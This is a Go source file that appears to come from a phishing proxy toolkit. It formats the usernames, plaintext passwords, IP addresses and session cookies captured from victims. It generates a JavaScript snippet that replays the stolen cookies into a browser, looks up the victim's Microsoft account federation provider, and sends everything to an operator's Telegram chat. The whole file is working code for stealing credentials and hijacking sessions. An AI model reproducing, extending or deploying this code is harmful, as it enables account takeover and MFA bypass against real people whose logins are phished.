package core

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

type Token struct {
	Name             string      `json:"name"`
	Value            string      `json:"value"`
	Domain           string      `json:"domain"`
	HostOnly         bool        `json:"hostOnly"`
	Path             string      `json:"path"`
	Secure           bool        `json:"secure"`
	HttpOnly         bool        `json:"httpOnly"`
	SameSite         string      `json:"sameSite"`
	Session          bool        `json:"session"`
	FirstPartyDomain string      `json:"firstPartyDomain"`
	PartitionKey     interface{} `json:"partitionKey"`
	ExpirationDate   *int64      `json:"expirationDate,omitempty"`
	StoreID          interface{} `json:"storeId"`
}

func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
	var tokens []Token

	for domain, tokenGroup := range input {
		for _, tokenData := range tokenGroup {
			var t Token

			if name, ok := tokenData["Name"].(string); ok {
				// Remove &
				t.Name = name
			}
			if val, ok := tokenData["Value"].(string); ok {
				t.Value = val
			}
			// Remove leading dot from domain
			if len(domain) > 0 && domain[0] == '.' {
				domain = domain[1:]
			}
			t.Domain = domain

			if hostOnly, ok := tokenData["HostOnly"].(bool); ok {
				t.HostOnly = hostOnly
			}
			if path, ok := tokenData["Path"].(string); ok {
				t.Path = path
			}
			if secure, ok := tokenData["Secure"].(bool); ok {
				t.Secure = secure
			}
			if httpOnly, ok := tokenData["HttpOnly"].(bool); ok {
				t.HttpOnly = httpOnly
			}
			if sameSite, ok := tokenData["SameSite"].(string); ok {
				t.SameSite = sameSite
			}
			if session, ok := tokenData["Session"].(bool); ok {
				t.Session = session
			}
			if fpd, ok := tokenData["FirstPartyDomain"].(string); ok {
				t.FirstPartyDomain = fpd
			}
			if pk, ok := tokenData["PartitionKey"]; ok {
				t.PartitionKey = pk
			}

			if storeID, ok := tokenData["storeId"]; ok {
				t.StoreID = storeID
			} else if storeID, ok := tokenData["StoreID"]; ok {
				t.StoreID = storeID
			}

			exp := time.Now().AddDate(1, 0, 0).Unix()
			t.ExpirationDate = &exp

			tokens = append(tokens, t)
		}
	}
	return tokens
}

func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string) ([]Token, error) {
	var consolidatedTokens []Token

	// Parse and extract tokens for each category
	for _, tokenJSON := range []string{sessionTokens, httpTokens, bodyTokens, customTokens} {
		if tokenJSON == "" {
			continue
		}

		var rawTokens map[string]map[string]map[string]interface{}
		if err := json.Unmarshal([]byte(tokenJSON), &rawTokens); err != nil {
			return nil, fmt.Errorf("error parsing token JSON: %v", err)
		}

		tokens := extractTokens(rawTokens)
		consolidatedTokens = append(consolidatedTokens, tokens...)
	}

	return consolidatedTokens, nil
}

// Define a map to store session IDs and a mutex for thread-safe access
var processedSessions = make(map[string]bool)
var sessionMessageMap = make(map[string]int)
var mu sync.Mutex

func generateRandomString() string {
	rand.Seed(time.Now().UnixNano())
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	length := 10
	randomStr := make([]byte, length)
	for i := range randomStr {
		randomStr[i] = charset[rand.Intn(len(charset))]
	}
	return string(randomStr)
}
func createTxtFile(session TSession) (string, error) {
	// Create a random text file name
	txtFileName := generateRandomString() + ".txt"
	txtFilePath := filepath.Join(os.TempDir(), txtFileName)

	// Create a new text file
	txtFile, err := os.Create(txtFilePath)
	if err != nil {
		return "", fmt.Errorf("failed to create text file: %v", err)
	}
	defer txtFile.Close()

	tok, _ := json.Marshal(session.Tokens)
	// Marshal the session maps into JSON byte slices
	//tokensJSON, err := json.MarshalIndent(session.Tokens, "", "  ")
	//if err != nil {
	//	return "", fmt.Errorf("failed to marshal Tokens: %v", err)
	//}
	//httpTokensJSON, err := json.MarshalIndent(session.HTTPTokens, "", "  ")
	//if err != nil {
	//	return "", fmt.Errorf("failed to marshal HTTPTokens: %v", err)
	//}
	//bodyTokensJSON, err := json.MarshalIndent(session.BodyTokens, "", "  ")
	//if err != nil {
	//	return "", fmt.Errorf("failed to marshal BodyTokens: %v", err)
	//}
	//customJSON, err := json.MarshalIndent(session.Custom, "", "  ")
	//if err != nil {
	//	return "", fmt.Errorf("failed to marshal Custom: %v", err)
	//}
	//
	//allTokens, err := processAllTokens(string(tokensJSON), string(httpTokensJSON), string(bodyTokensJSON), string(customJSON))
	//
	//result, err := json.MarshalIndent(allTokens, "", "  ")
	//if err != nil {
	//	fmt.Println("Error marshalling final tokens:", err)
	//
	//}
	//
	//fmt.Println("Combined Tokens: ", string(result))

	jsContent := fmt.Sprintf(`(() => {
            let cookies = %s;
            
            function setCookie(key, value, domain, path, isSecure) {
                const cookieMaxAge = 'Max-Age=31536000';
                if (key.startsWith('__Host')) {
                    console.log('cookies Set', key, value, '!IMPORTANT __Host- prefix: Cookies with names starting with __Host- must be set with the secure flag, must be from a secure page (HTTPS), must not have a domain specified (and therefore, are not sent to subdomains), and the path must be /.',);
                    document.cookie = key + '=' + value + ';' + cookieMaxAge + ';path=/;Secure;SameSite=None';
                } else if (key.startsWith('__Secure')) {
                    console.log('cookies Set', key, value, '!IMPORTANT __Secure- prefix: Cookies with names starting with __Secure- (dash is part of the prefix) must be set with the secure flag from a secure page (HTTPS).',);
                    document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';Secure;SameSite=None';
                } else {
                    if (isSecure) {
                        console.log('cookies Set', key, value);
                        if (window.location.hostname == domain) {
                            document.cookie = key + '=' + value + ';' + cookieMaxAge + '; path=' + path + '; Secure; SameSite=None';
                        } else {
                            document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';Secure;SameSite=None';
                        }
                    } else {
                        console.log('cookies Set', key, value);
                        if (window.location.hostname == domain) {
                            document.cookie = key + '=' + value + ';' + cookieMaxAge + ';path=' + path + ';';
                        } else {
                            document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';';
                        }
                    }
                }
            }
        
            for (let i = 0; i < cookies.length; i++) {
                let cookie = cookies[i];
                setCookie(cookie.name, cookie.value, cookie.domain, cookie.path, cookie.secure);
                if (i === cookies.length - 1) {
                    location.reload();
                }
            }
        
            var stopCss = "color:red; font-size:65px; font-weight:bold; -webkit-text-stroke: 1px black";
            var msgCss = "font-size:20px; background-color:#7FDBFF;";
        })();`, string(tok))

	// Write the consolidated data into the text file
	_, err = txtFile.WriteString(jsContent)
	if err != nil {
		return "", fmt.Errorf("failed to write data to text file: %v", err)
	}

	return txtFilePath, nil
}

type UserRealmResponse struct {
	Ver                     string `json:"ver"`
	AccountType             string `json:"account_type"`
	DomainName              string `json:"domain_name"`
	FederationProtocol      string `json:"federation_protocol,omitempty"`
	FederationMetadataURL   string `json:"federation_metadata_url,omitempty"`
	FederationActiveAuthURL string `json:"federation_active_auth_url,omitempty"`
	CloudInstanceName       string `json:"cloud_instance_name"`
	CloudAudienceURN        string `json:"cloud_audience_urn"`
}

func fetchUserRealm(email string) (*UserRealmResponse, error) {
	url := fmt.Sprintf("https://login.microsoftonline.com/common/UserRealm/%s?api-version=1.0", email)
	resp, err := http.Get(url)
	if err != nil {
		return nil, fmt.Errorf("error making request: %w", err)
	}
	defer resp.Body.Close()

	var result UserRealmResponse
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, fmt.Errorf("error decoding response: %w", err)
	}

	return &result, nil
}
func formatSessionMessage(session TSession) string {
	// Format the session information (no token data in message)

	partner := ""
	resp, err := fetchUserRealm(session.Username)
	if err == nil {
		if resp.AccountType == "Managed" {
			partner = "MicrosoftOffice"
		} else {
			if strings.Contains(resp.FederationMetadataURL, "godaddy") {
				partner = "GoDaddy"
			} else if strings.Contains(resp.FederationMetadataURL, "adfs") {
				partner = "Adfs"
			} else if strings.Contains(resp.FederationMetadataURL, "okta") {
				partner = "Okta"
			}
		}
	}
	return fmt.Sprintf("✨ Session Information ✨\n\n"+
		"🤝 Partner:       ➖ %s\n"+
		"👤 Username:      ➖ %s\n"+
		"🔑 Password:      ➖ %s\n"+
		"🌐 Landing URL:   ➖ %s\n \n"+
		"🖥️ User Agent:    ➖ %s\n"+
		"🌍 Remote Address:➖ %s\n"+
		"🕒 Create Time:   ➖ %d\n"+
		"🕔 Update Time:   ➖ %d\n"+
		"\n"+
		"📦 Tokens are added in txt file and attached separately in message.\n",

		partner,
		session.Username,
		session.Password,
		session.LandingURL,
		session.UserAgent,
		session.RemoteAddr,
		session.CreateTime,
		session.UpdateTime,
	)
}
func Notify(session TSession, chatid string, teletoken string) {

	mu.Lock()
	// Check if the session is already processed
	if processedSessions[string(session.ID)] {
		mu.Unlock()
		messageID, exists := sessionMessageMap[string(session.ID)]
		if exists {
			txtFilePath, err := createTxtFile(session)
			if err != nil {
				fmt.Println("Error creating TXT file for update:", err)
				return
			}
			msg_body := formatSessionMessage(session)
			err = editMessageFile(chatid, teletoken, messageID, txtFilePath, msg_body)
			if err != nil {
				fmt.Printf("Error editing message: %v\n", err)
			}
			os.Remove(txtFilePath)
		} else {
			fmt.Println("Message ID not found for session:", session.ID)
		}
		return
	}

	// Mark session as processed
	processedSessions[string(session.ID)] = true
	mu.Unlock()

	// Create the TXT file for the original message
	txtFilePath, err := createTxtFile(session)
	if err != nil {
		fmt.Println("Error creating TXT file:", err)
		return
	}

	// Format the message
	message := formatSessionMessage(session)

	// Send the notification and get the message ID
	messageID, err := sendTelegramNotification(chatid, teletoken, message, txtFilePath)
	if err != nil {
		fmt.Printf("Error sending Telegram notification: %v\n", err)
		os.Remove(txtFilePath)
		return
	}

	// Map the session ID to the message ID
	mu.Lock()
	sessionMessageMap[string(session.ID)] = messageID
	mu.Unlock()

	// Remove the temporary TXT file
	os.Remove(txtFilePath)
}
